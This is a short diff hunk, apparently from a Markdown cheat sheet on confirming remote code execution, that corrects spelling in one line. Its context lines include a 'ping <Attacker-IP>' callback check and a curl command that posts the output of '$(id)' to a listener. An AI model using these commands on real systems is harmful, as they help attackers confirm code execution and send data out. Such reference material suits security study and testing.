@@ -2001,7 +2001,7 @@ ping <Attacker-IP>
 You can specify a number of pings with -c agrments, If ICMP requests recieved, RCE achieved
 
 ## Curl
-Execute commands and recieve data under the POST requet
+Execute commands and recieve data with the POST request
 ```bash
 curl -d '$(id)' 127.0.0.1:9988
 ```
